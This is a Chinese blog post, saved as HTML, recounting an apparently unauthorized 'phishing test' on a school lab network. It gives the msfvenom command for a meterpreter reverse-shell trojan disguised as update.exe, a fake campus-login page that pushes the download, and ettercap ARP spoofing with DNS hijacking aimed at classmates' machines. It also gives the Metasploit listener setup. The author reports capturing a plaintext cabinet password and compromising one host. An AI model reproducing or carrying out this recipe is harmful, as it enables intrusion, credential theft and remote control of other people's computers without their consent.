@@ -1,0 +1,346 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>记一次实验室钓鱼 | 52hertzi</title><meta name="keywords" content="metasploit,kali,钓鱼,ARP欺骗,dns劫持"><meta name="author" content="Shawn"><meta name="copyright" content="Shawn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="前言 学校的新实验室修好了，并且电脑中并没有安装任何安全软件，所以突发奇想想实施一次钓鱼测试并上传木马软件。  实验环境：win10系统；kali系统。  流程如下  1、将自己电脑中的kali导出然后导入实验室电脑的虚拟机中。 2、实验室的电脑ip为固定ip。范围172.23.60.1-    -172.23.60.254。将kali设置为桥接模式并配置固定ip 172.23.60.200。 3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次实验室钓鱼">
+<meta property="og:url" content="http://52hertzi.com/2020/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%92%93%E9%B1%BC/index.html">
+<meta property="og:site_name" content="52hertzi">
+<meta property="og:description" content="前言 学校的新实验室修好了，并且电脑中并没有安装任何安全软件，所以突发奇想想实施一次钓鱼测试并上传木马软件。  实验环境：win10系统；kali系统。  流程如下  1、将自己电脑中的kali导出然后导入实验室电脑的虚拟机中。 2、实验室的电脑ip为固定ip。范围172.23.60.1-    -172.23.60.254。将kali设置为桥接模式并配置固定ip 172.23.60.200。 3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/11/09/A9IgHFYfoUxyTP7.jpg">
+<meta property="article:published_time" content="2020-12-23T11:53:36.000Z">
+<meta property="article:modified_time" content="2021-06-30T14:35:44.525Z">
+<meta property="article:author" content="Shawn">
+<meta property="article:tag" content="metasploit">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="钓鱼">
+<meta property="article:tag" content="ARP欺骗">
+<meta property="article:tag" content="dns劫持">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/11/09/A9IgHFYfoUxyTP7.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://52hertzi.com/2020/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%92%93%E9%B1%BC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Shawn","link":"链接: ","source":"来源: 52hertzi","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-06-30 22:35:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2020/11/09/qgoaAWLQdRIs7uD.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-envira"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/11/09/A9IgHFYfoUxyTP7.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">52hertzi</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-envira"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">记一次实验室钓鱼</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-23T11:53:36.000Z" title="发表于 2020-12-23 19:53:36">2020-12-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-06-30T14:35:44.525Z" title="更新于 2021-06-30 22:35:44">2021-06-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/">实战测试</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li><p>学校的新实验室修好了，并且电脑中并没有安装任何安全软件，所以突发奇想想实施一次钓鱼测试并上传木马软件。</p>
+</li>
+<li><p>实验环境：win10系统；kali系统。</p>
+</li>
+<li><p>流程如下</p>
+<blockquote>
+<p>1、将自己电脑中的kali导出然后导入实验室电脑的虚拟机中。</p>
+<p>2、实验室的电脑ip为固定ip。范围172.23.60.1-    -172.23.60.254。将kali设置为桥接模式并配置固定ip 172.23.60.200。</p>
+<p>3、实验室机柜中的路由设备需要登陆校园网才能使用，所以将将登陆校园网的页面作为钓鱼页面。访问钓鱼页面自动下载木马，并延迟自动跳转真实网页登陆。</p>
+<p>4、kali中msfvenom生成木马程序</p>
+<p>5、kali打开metasploit框架设置好payload开启监听。</p>
+<p>6、修改/etc/ettercap/etter.dns配置文件</p>
+<p>7、使用ettercap软件中进行arp欺骗</p>
+<p>8、等待木马上线……</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><h2 id="Msfvenom木马制作"><a href="#Msfvenom木马制作" class="headerlink" title="Msfvenom木马制作"></a>Msfvenom木马制作</h2><p>打开kali，命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.23.60.200 LPORT=45678 -f exe &gt; /var/www/html/update.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/12/23/7dPTjW1whMrKN4i.png"></p>
+<p>查看木马生成位置，这里的位置是var/www/html</p>
+<p><img src="https://i.loli.net/2020/12/23/F6NeK9nSlO1fYbo.png"></p>
+</li>
+</ul>
+<ul>
+<li><h2 id="钓鱼页面制作"><a href="#钓鱼页面制作" class="headerlink" title="钓鱼页面制作"></a>钓鱼页面制作</h2><p>这里已经制作了好了钓鱼页面</p>
+<p><img src="https://i.loli.net/2020/12/23/KIxGFgqiezo9MVL.png"></p>
+<p>​    这里的钓鱼页面抖了个激灵！在克隆网页完成的时候发现克隆的网页不能正常显示。（这里分别使用了setoolkit、httrack均无法成功克隆），所以这里使用了校园网登陆页面的截图。</p>
+<p>​    这里的逻辑–&gt;当用户访问时，将弹窗提示更新插件并运行，当用户点击确定，将会下载木马，页面将延迟7秒跳转到校园网登陆页面。</p>
+<p>​    测试访问能否下载木马：</p>
+<blockquote>
+<p>开启apache服务</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/23/GlcjbOr2ya35Qpf.png"></p>
+<blockquote>
+<p>访问172.23.60.200进行测试</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/12/23/NMY1pATUwJliaht.png"></p>
+<p>可弹窗下载木马。</p>
+</li>
+</ul>
+<ul>
+<li><h2 id="Ettercap-可视化配置"><a href="#Ettercap-可视化配置" class="headerlink" title="Ettercap 可视化配置"></a>Ettercap 可视化配置</h2><p>命令行输入：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/12/23/r51UeinPpjfY4yH.png"></p>
+<p><img src="https://i.loli.net/2020/12/23/8wmOgAxqT46yFe5.png"></p>
+<p><img src="https://i.loli.net/2020/12/23/BvTezPxGmVr3NoZ.png"></p>
+<p>点击Hosts，先扫描（蓝色）当前局域网下存活的主机。扫描完成后查看存活主机列表（红色）</p>
+<p><img src="https://i.loli.net/2020/12/23/jhIfiyKeAqLGdrX.png"></p>
+<p>查看存活主机列表</p>
+<p><img src="https://i.loli.net/2020/12/23/1cNe8hLKxYC2sM5.png"></p>
+<p>这里可以看到172.23.60.1为局域网的网关，点击加入Target 1</p>
+<p>点击目标ip加入Target 2（钓鱼目标）。</p>
+</li>
+</ul>
+<p>  开启arp欺骗。</p>
+<p>  <img src="https://i.loli.net/2020/12/23/aEQNjrs5SA8Y7Ul.png"></p>
+<p>  选择第一个选项。</p>
+<p>  <img src="https://i.loli.net/2020/12/23/sypYnoTGmINFtuQ.png"></p>
+<p>  接下来设置插件dns_spoof</p>
+<p>  <img src="https://i.loli.net/2020/12/23/uInmwHrtzy1CXTl.png"></p>
+<p>  双击dns_spoof选中插件</p>
+<p>  <img src="https://i.loli.net/2020/12/23/6zW9gkEf3F7up85.png"></p>
+<ul>
+<li><h2 id="Metasploit框架配置"><a href="#Metasploit框架配置" class="headerlink" title="Metasploit框架配置"></a>Metasploit框架配置</h2><p>启动metasploit框架</p>
+<p><img src="https://i.loli.net/2020/12/23/DrlPGZyIja31Aqb.png"></p>
+<p>shell命令如下：</p>
+<p>1、选择使用模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/12/23/WpiwlV4HPXoYjtN.png"></p>
+<p>2、设置payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="F:\GitHub\Blogs\source_posts\2Cd5BtIvqxbE8LX.png"></p>
+<p>3、设置查看参数并开启监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set LHOST 172.23.60.200</span><br><span class="line">set LPORT 45678</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="F:\GitHub\Blogs\source_posts\DiGrFR6Jled7nYb.png"></p>
+</li>
+</ul>
+<ul>
+<li><h2 id="Etter-dns配置"><a href="#Etter-dns配置" class="headerlink" title="Etter.dns配置"></a>Etter.dns配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi etc/ettercap/etter.dns       ##dns配置文件修改</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/12/23/EAXbCTrP6FsLcBi.png"></p>
+<p>将所有url的ip地址指向钓鱼网页</p>
+<p><img src="https://i.loli.net/2020/12/23/odpri6VLJbjsIe8.png"></p>
+</li>
+</ul>
+<ul>
+<li><h2 id="开始钓鱼攻击"><a href="#开始钓鱼攻击" class="headerlink" title="开始钓鱼攻击"></a>开始钓鱼攻击</h2><p>回到ettercap可视化交界面点击start</p>
+<p><img src="https://i.loli.net/2020/12/23/mPCrDVEbviuJIen.png"></p>
+<p>然后就静静的等待“鱼儿”上钩。</p>
+<p>查看“鱼儿”的IP</p>
+<p><img src="https://i.loli.net/2020/12/23/xvzPMaNhJdp6XUK.png"></p>
+<p>很多同学都在做路由实验，所以仅随机抽取几个小可爱的ip进行实验。</p>
+<p>在等待的时候还顺便抓到了控制机柜登陆的明文密码</p>
+<p><img src="https://i.loli.net/2020/12/23/jbSEXATRvaetlDP.png"></p>
+</li>
+</ul>
+<p>  漫长的等待（又陆续添加了些ip，未显示于下图中）……</p>
+<p>  <img src="https://i.loli.net/2020/12/23/bVsW8XhJTfmx9CQ.jpg"></p>
+<ul>
+<li><h2 id="成功钓鱼"><a href="#成功钓鱼" class="headerlink" title="成功钓鱼"></a>成功钓鱼</h2><p><img src="https://i.loli.net/2020/12/23/j6E2GB4PFNZWsrX.png"></p>
+<p><strong>ip为172.23.62.76的主机成功上线。</strong></p>
+</li>
+</ul>
+<ul>
+<li><h2 id="DNS工作原理"><a href="#DNS工作原理" class="headerlink" title="DNS工作原理"></a>DNS工作原理</h2><p>递归与迭代：</p>
+<p><img src="https://i.loli.net/2020/12/23/O91nFprBDM657bG.png"></p>
+</li>
+</ul>
+<blockquote>
+<p>1、DNS客户端查询先采用递归方式，先确认本地DNS文件是否有域名和IP的解析表。如果没有，则将请求发送给缓存服务器，缓存服务器判断本地是否有这个域名的解析缓存。</p>
+<p>2、如果本地没有缓存，就会把域名发送到根服务器。根服务器收到www baidu.com请求后，会判断.com是谁授权管理，并返回.com所在的顶级域名服务器IP地址。</p>
+<p>3、缓存服务器继续向顶级域名服务器发送www baidu.com的解析请求，顶级域名服务器收到请求后，会返回下一级.baidu.com的递归服务器IP地址。</p>
+<p>4、缓存服务器继续向递归服务器发送www baidu.com的解析请求，递归服务器收到请求后，返回www baidu.com的解析地址。如果域名层级较多，则递归服务器也会存在多级。</p>
+<p>5、缓存服务器得到www baidu.com的解析IP后，将IP地址发送给客户端，同时在本地存储。</p>
+<p>6、后续一段时间内，当有客户端再次请求www baidu.com的域名解析时，缓存服务器直接回应解析的IP地址，不再重复询问。</p>
+</blockquote>
+<ul>
+<li><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li>
+</ul>
+<p>1、本次实验当中，当网络协议为https的时候无法正常跳转到钓🐟页面，并且无法显示。在查询资料后发现其实https并不能防止DNS劫持，但是由于浏览器的证书校验不通过所以钓鱼点返回的内容也无法展示。只要不随意信任来源不明的证书，就可以从根本上防DNS劫持并且HTTPS可以防流量劫持，因为内容是加密的。</p>
+<p>2、局域网DNS劫持： 本质利用了ARP欺骗原理。攻击机通过ARP欺骗伪装成缓存服务器，将客户端的DNS请求返回指定的IP地址。</p>
+<p>3、<a target="_blank" rel="noopener" href="https://blog.csdn.net/yunqiinsight/article/details/102544840?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160873092116780299093934%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=160873092116780299093934&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-102544840.nonecase&utm_term=dns%E5%8A%AB%E6%8C%81%E9%82%A3%E4%BA%9B%E4%BA%8B">DNS劫持那些事</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Shawn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://52hertzi.com/2020/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%92%93%E9%B1%BC/">http://52hertzi.com/2020/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%92%93%E9%B1%BC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://52hertzi.com" target="_blank">52hertzi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/metasploit/">metasploit</a><a class="post-meta__tags" href="/tags/kali/">kali</a><a class="post-meta__tags" href="/tags/%E9%92%93%E9%B1%BC/">钓鱼</a><a class="post-meta__tags" href="/tags/ARP%E6%AC%BA%E9%AA%97/">ARP欺骗</a><a class="post-meta__tags" href="/tags/dns%E5%8A%AB%E6%8C%81/">dns劫持</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/11/09/A9IgHFYfoUxyTP7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://i.loli.net/2020/11/09/NkrICVse9BUfKMx.png" target="_blank"><img class="post-qr-code-img" src="https://i.loli.net/2020/11/09/NkrICVse9BUfKMx.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://i.loli.net/2020/11/09/kLFt7qs1woZvu4x.jpg" target="_blank"><img class="post-qr-code-img" src="https://i.loli.net/2020/11/09/kLFt7qs1woZvu4x.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/14/Python%E5%9F%BA%E7%A1%80/"><img class="prev-cover" src="https://i.loli.net/2021/01/14/N6VreoRqaMWmCJB.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python基础</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/08/Pikachu%E4%B9%8B%E9%80%9A%E5%85%B3%E4%B9%8B%E6%97%85/"><img class="next-cover" src="https://i.loli.net/2021/01/23/6NfDvmI2c5VesXP.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Pikachu通关之旅</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/21/Metasploit基础/" title="Metasploit基础"><img class="cover" src="https://i.loli.net/2021/01/22/8hX2dFlMCgRtioN.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-06-30</div><div class="title">Metasploit基础</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://i.loli.net/2020/11/09/qgoaAWLQdRIs7uD.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Shawn</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/52hertzi"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">2020 实鼠不易 , 2021 牛转乾坤！淦</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msfvenom%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C"><span class="toc-number">2.</span> <span class="toc-text">Msfvenom木马制作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E5%88%B6%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">钓鱼页面制作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ettercap-%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE"><span class="toc-number">4.</span> <span class="toc-text">Ettercap 可视化配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE"><span class="toc-number">5.</span> <span class="toc-text">Metasploit框架配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Etter-dns%E9%85%8D%E7%BD%AE"><span class="toc-number">6.</span> <span class="toc-text">Etter.dns配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="toc-number">7.</span> <span class="toc-text">开始钓鱼攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E9%92%93%E9%B1%BC"><span class="toc-number">8.</span> <span class="toc-text">成功钓鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">9.</span> <span class="toc-text">DNS工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/22/drozer%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E6%B5%8B%E8%AF%95/" title="drozer安全测试框架安装与测试"><img src="https://i.loli.net/2021/08/22/RUqfSFolvnXAriM.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="drozer安全测试框架安装与测试"/></a><div class="content"><a class="title" href="/2021/08/22/drozer%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E6%B5%8B%E8%AF%95/" title="drozer安全测试框架安装与测试">drozer安全测试框架安装与测试</a><time datetime="2021-08-22T14:08:30.763Z" title="更新于 2021-08-22 22:08:30">2021-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/26/Web%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E4%B9%8Bpython/" title="Web白帽子学习之python"><img src="https://i.loli.net/2021/05/26/8lZwKsRLpiaeuMg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web白帽子学习之python"/></a><div class="content"><a class="title" 